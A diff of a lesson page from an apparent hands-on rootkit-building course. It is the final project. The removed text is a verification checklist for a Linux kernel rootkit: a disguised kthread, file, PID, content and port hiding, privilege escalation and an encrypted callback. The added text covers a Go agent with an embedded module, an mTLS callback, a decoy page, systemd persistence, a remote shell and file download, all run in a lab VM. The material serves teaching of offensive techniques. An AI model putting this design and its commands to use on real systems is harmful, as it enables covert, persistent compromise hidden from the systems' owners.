@@ -1,257 +1,218 @@
-# Assemble and verify the complete rootkit
+# P00: Complete Rootkit
 
-This is the final project.
-You have built every subsystem across 27 lessons and 6 milestones.
-The starter is your M05 solution, fully working.
-Run the verification checklist below to confirm every capability end to end.
+M03 proved that the integrated agent can deploy from memory, conceal selected
+traces, and remain controllable.
+P00 turns that integration into the complete product: a modular agent, durable
+startup, reconnect and singleton handling, and the full multi-target operator
+with terminal and browser interfaces.
 
-## Verification checklist
+The task is operational.
+Start each side independently, observe the callback, use the real controls, and
+prove persistence and removal with reboots.
 
-### 1. Key generation
+## What P00 adds to M03
 
-```sh
-key=$(openssl rand -hex 32)
-echo "$key"
-```
+| M03 integration lesson     | P00 complete product                           |
+| -------------------------- | ---------------------------------------------- |
+| Focused lab server         | Full independent operator                      |
+| One exercise agent         | Modular agent package                          |
+| Ordered deployment         | Idempotent deployment and reconnect            |
+| Focused command checks     | TUI, browser, PTY, files, processes, and ports |
+| Concealment checks         | Procfs and `sock_diag` port filtering          |
+| No complete boot lifecycle | Install, reboot, reconnect, remove, reboot     |
 
-Save this key.
-You will use it for both loading and connecting.
+P00 reuses the mechanisms taught by M03; it does not introduce another hiding
+model.
 
-### 2. Module load
-
-```sh
-insmod rklings.ko control_key="$key"
-```
-
-Verify: `dmesg | tail` shows nothing from the module.
-This is OPSEC.
-A rootkit that announces itself in the kernel log is already detected.
-
-### 3. Operator connection
-
-From the operator machine (or localhost for testing):
-
-```sh
-./operator --key "$key" --host <target> --port 4444
-```
-
-The agent connects OUT to the operator (callback architecture).
-The encrypted handshake validates the shared key before any commands are
-accepted.
-
-### 4. Basic commands
+## System
 
 ```text
-operator> PING
-PONG
+OPERATOR HOST                              TARGET VM
 
-operator> INFO
-sysname: Linux
-nodename: target-vm
-release: 7.2.5-4-omarchy
-version: #1 SMP ...
-machine: x86_64
-
-operator> STATUS
-files: 0
-pids: 0
-contents: 0
-ports: 0
-cloaked: no
-persisted: no
++----------------------+                  +----------------------+
+| ./rklings serve P00  |   TLS 1.3 mTLS   | rklings_agent        |
+| terminal + web UI    | <--------------> | reconnect + persist  |
++----------------------+                  +----------+-----------+
+                                                    |
+                                                    | mkdir controls
+                                                    v
+                                         +----------------------+
+                                         | embedded module      |
+                                         | filtering + control  |
+                                         +----------------------+
 ```
 
-### 5. File hiding
+The separation is intentional:
+
+- `rklings run P00` builds the target, stages the agent, and boots the VM.
+- The agent runs inside the VM and initiates the callback.
+- `rklings serve P00` accepts callbacks and starts both operator interfaces.
+
+An agent must tolerate an offline operator, so none of these commands silently
+starts another component.
+
+## Workspace
 
 ```text
-operator> HIDE FILE secret.txt
-hidden
+exercises/P00-complete-rootkit
+├── agent
+│   ├── dispatch.go
+│   ├── evasion.go
+│   ├── go.mod
+│   ├── go.sum
+│   ├── handlers.go
+│   ├── hidden.go
+│   ├── main.go
+│   ├── operator.go
+│   ├── persistence.go
+│   ├── singleton.go
+│   └── transport.go
+└── kernel
+    ├── Kbuild
+    ├── core
+    │   ├── dispatch.c
+    │   ├── escalation.c
+    │   ├── filter.c
+    │   ├── init.c
+    │   ├── module.c
+    │   └── target.c
+    └── include
+        └── rootkit.h
 ```
 
-On the target:
+The operator is the completed host product in `product/operator`; it is not
+duplicated in the learner workspace.
 
-```sh
-echo "classified" > /tmp/secret.txt
-ls /tmp/           # secret.txt is gone
-cat /tmp/secret.txt  # still accessible if you know the name
+## Run it
+
+Use three terminals so every boundary stays visible.
+
+### 1. Boot the victim
+
+```console
+$ ./rklings run P00
+[*] booting VM...
+[+] VM ready
+[+] agent staged at /rklings/rklings_agent
+
+root@victim:~#
 ```
+
+The runner does not start the agent or operator.
+
+### 2. Start the agent inside the victim
+
+```console
+root@victim:~# setsid -f /rklings/rklings_agent \
+  </dev/null >/dev/null 2>&1
+root@victim:~#
+```
+
+Detaching and redirecting the standard streams keeps the VM shell usable.
+The agent now retries `10.0.2.2:8443`; starting it before the server proves that
+the victim initiates the callback and survives operator downtime.
+
+### 3. Start the operator on the host
+
+```console
+$ ./rklings serve P00
+```
+
+The pending agent connects over mTLS.
+The same process provides:
 
 ```text
-operator> LIST FILE
-[0] secret.txt
-
-operator> UNHIDE FILE secret.txt
-unhidden
+terminal operator   current terminal
+browser dashboard   http://127.0.0.1:8080
+agent listener      https://0.0.0.0:8443
 ```
 
-### 6. PID hiding
+Opening the agent listener without a trusted client certificate returns the
+decoy page.
+A certified agent reaches the operator protocol on that same port.
+
+## Operate it
+
+The first agent is selected automatically.
+With multiple victims, use `agents` and `use <id>` to choose the target
+explicitly.
 
 ```text
-operator> HIDE PID 1234
-hidden
+victim-17def67e > info
+system   victim / 7.0.0-38-generic / amd64
+agent    pid=915 uid=0
+stealth  module=on persistence=on
+
+victim-17def67e > exec id
+stdout
+uid=0(root) gid=0(root) groups=0(root)
+exit 0
+
+victim-17def67e > download /etc/hostname
+saved 7 bytes -> .rklings/downloads/victim-17def67e/etc/hostname
 ```
 
-On the target:
+`info` issues `rklings.info` through the existing mkdir hook.
+The module copies its in-memory target ledger into the caller's writable
+pathname buffer and returns the response length.
+It does not publish a procfs entry or maintain a second userspace ledger.
+Commands issued directly in the victim shell therefore appear on the next
+operator refresh as well.
 
-```sh
-ps aux | grep 1234    # gone from output
-```
+Use `exec` for finite commands with separate stdout, stderr, and exit status.
+Use `shell` for a persistent PTY; `Ctrl+]` returns to the operator without
+closing the remote shell.
+The terminal saves downloads under the selected target instead of printing
+arbitrary file bytes.
+The browser provides an explicit preview and save action.
+
+Hide and unhide use the same type and value:
 
 ```text
-operator> LIST PID
-[0] 1234
+victim-17def67e > hide file secret.txt
+ok
+victim-17def67e > unhide file secret.txt
+ok
 ```
 
-### 7. Content hiding
+Tab completes commands and target IDs. `Ctrl+L` clears the console.
+The browser controls the same live target and refreshes its overview and
+inventories after commands.
+
+## Prove persistence
+
+Initial deployment installs and enables the self-contained agent service.
+Reboot the guest while leaving the operator running:
+
+```console
+root@victim:~# reboot
+```
+
+The VM remains active.
+After boot, systemd starts the agent, the agent loads its embedded module, and
+the target reconnects without a manual launch.
+The reboot proves the boot path; the presence of a unit file alone would not.
+
+Remove persistence and test the opposite result:
 
 ```text
-operator> HIDE CONTENT password123
-hidden
+victim-17def67e > unpersist
+ok
 ```
 
-On the target:
+`unpersist` removes the durable service without terminating the current
+in-memory session.
+Reboot again.
+The target must remain absent.
 
-```sh
-cat /etc/shadow    # lines containing "password123" are filtered
+## Validate
+
+```console
+$ ./rklings validate P00
 ```
 
-### 8. Port hiding
+Validation exercises the real callback and kernel controls, checks that hidden
+objects remain functional, reboots with persistence enabled, verifies the
+reconnect, removes persistence, reboots again, and verifies absence.
 
-```text
-operator> HIDE PORT 8080
-hidden
-```
-
-On the target:
-
-```sh
-ss -tlnp | grep 8080    # gone from output
-```
-
-### 9. Persistence
-
-```text
-operator> PERSIST
-persisted
-```
-
-On the target:
-
-```sh
-cat /etc/modules-load.d/rklings.conf    # contains "rklings"
-```
-
-```text
-operator> UNPERSIST
-unpersisted
-```
-
-Verify the file is gone.
-
-### 10. Privilege escalation
-
-```text
-operator> ESCALATE
-escalated
-```
-
-The operator's session now runs with UID 0 capabilities.
-
-### 11. File download
-
-```text
-operator> DOWNLOAD /etc/hostname
-target-vm
-```
-
-Verify the contents match `cat /etc/hostname` on the target.
-
-### 12. Auto-OPSEC verification
-
-While connected:
-
-```sh
-ps aux | grep kworker/u8:3    # agent kthread is hidden
-ss -tlnp | grep 4444          # connection port is hidden
-```
-
-Disconnect the operator, then:
-
-```sh
-ps aux | grep kworker/u8:3    # kthread reappears
-ss -tlnp | grep 4444          # port reappears
-```
-
-### 13. Network traffic analysis
-
-```sh
-tcpdump -i lo port 4444 -X
-```
-
-All captured data is encrypted (AES-256-GCM).
-No plaintext commands or responses are visible in the packet capture.
-
-### 14. Clean unload
-
-```sh
-rmmod rklings
-```
-
-Verify:
-
-- No kernel faults in dmesg
-- All hidden entries are restored
-- Module is removed from lsmod
-- Socket is released
-- Kthread is stopped
-- Sensitive memory is zeroed
-
-## Architecture summary
-
-```text
-insmod rklings.ko control_key=<hex>
-    |
-    +-- parse key, zero parameter
-    +-- init target lists, kretprobes, shell subsystem
-    +-- spawn agent kthread (disguised as kworker/u8:3)
-    |
-    +-- agent loop:
-         |
-         +-- rk_connect() to operator (callback, exponential backoff)
-         +-- AEAD handshake (HELLO exchange)
-         +-- auto-hide kthread PID + connection port
-         +-- recv/decrypt/dispatch loop:
-         |     |
-         |     +-- PING, INFO, STATUS
-         |     +-- LIST FILE/PID/CONTENT/PORT
-         |     +-- HIDE/UNHIDE FILE/PID/CONTENT/PORT
-         |     +-- PERSIST/UNPERSIST
-         |     +-- ESCALATE
-         |     +-- DOWNLOAD <path>
-         |     +-- SHELL, EXEC <cmd>
-         |     +-- CLOAK/UNCLOAK
-         |
-         +-- auto-unhide PID + port
-         +-- crypto_free_aead, sock_release
-         +-- retry with backoff
-
-rmmod rklings
-    |
-    +-- restore module visibility
-    +-- stop kthread
-    +-- shutdown + release socket
-    +-- unregister kretprobes
-    +-- zero key material
-```
-
-## Your task
-
-Your starter is the complete, working M05 solution.
-Review the code, understand every subsystem, then run the full checklist.
-If any check fails, trace the issue through the code and fix it.
-
-Run:
-
-```sh
-./rklings check
-```
+P00 is complete when the manual runbook and automated lifecycle both pass.
